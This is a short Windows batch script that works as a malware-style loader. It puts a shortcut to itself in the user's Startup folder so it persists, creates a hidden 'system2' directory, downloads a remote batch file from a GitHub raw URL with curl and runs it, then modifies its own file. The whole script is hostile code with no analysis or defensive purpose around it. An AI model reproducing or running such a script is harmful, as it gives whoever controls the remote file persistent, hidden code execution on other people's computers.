@echo off
echo %~nx0
:: Copy to startup
:: (FAILED)
:: robocopy %~nx0 "C:\Users\thoihenba\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /E
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\%~n0.lnk');$s.TargetPath='%~f0';$s.Save()"
mkdir system2
attrib +h system2
cd system2
curl https://raw.githubusercontent.com/your-idiot-friend/potato/refs/heads/main/c > commands.bat
call commands.bat
echo ":: E" >> %~nx0